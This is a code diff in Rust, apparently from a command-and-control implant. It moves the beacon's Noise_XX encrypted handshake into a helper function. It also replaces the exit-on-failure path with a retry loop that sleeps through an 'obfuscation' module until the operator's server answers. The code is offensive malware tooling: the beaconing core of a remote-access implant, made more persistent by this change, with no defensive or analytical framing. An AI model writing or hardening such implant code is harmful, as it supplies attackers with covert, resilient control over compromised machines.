@@ -233,28 +233,40 @@ impl Transport for HttpTransport {
     }
 }
 
+fn perform_handshake(transport: &mut HttpTransport, buf: &mut [u8]) -> Result<snow::TransportState, ()> {
+    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().map_err(|_| ())?;
+    let mut noise = Builder::new(params).build_initiator().map_err(|_| ())?;
+
+    let len = noise.write_message(&[], buf).map_err(|_| ())?;
+    let resp = transport.request(&buf[..len])?;
+
+    noise.read_message(&resp, &mut []).map_err(|_| ())?;
+
+    let len = noise.write_message(&[], buf).map_err(|_| ())?;
+    let _ = transport.request(&buf[..len])?;
+
+    noise.into_transport_mode().map_err(|_| ())
+}
+
 pub fn run_beacon_loop(_initial_config: C2Config) -> !
 {
     let config = C2Config::get_global();
     let mut transport = HttpTransport::new(config.server_addr, 8080);
     let mut buf = [0u8; 8192];
 
-    // Handshake
-    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().unwrap();
-    let mut noise = Builder::new(params).build_initiator().unwrap();
+    let mut session;
+    loop {
+        match perform_handshake(&mut transport, &mut buf) {
+            Ok(s) => {
+                session = s;
+                break;
+            },
+            Err(_) => {
+                crate::utils::obfuscation::sleep(config.sleep_interval);
+            }
+        }
+    }
 
-    let len = noise.write_message(&[], &mut buf).unwrap();
-    let resp = match transport.request(&buf[..len]) {
-        Ok(r) => r,
-        Err(_) => unsafe { crate::utils::syscalls::sys_exit(1) },
-    };
-
-    noise.read_message(&resp, &mut []).expect("Handshake read failed");
-
-    let len = noise.write_message(&[], &mut buf).unwrap();
-    let _ = transport.request(&buf[..len]); 
-
-    let mut session = noise.into_transport_mode().unwrap();
     let mut packet_count: u64 = 0;
     let mut last_rekey = 0; // Simplified time proxy
 
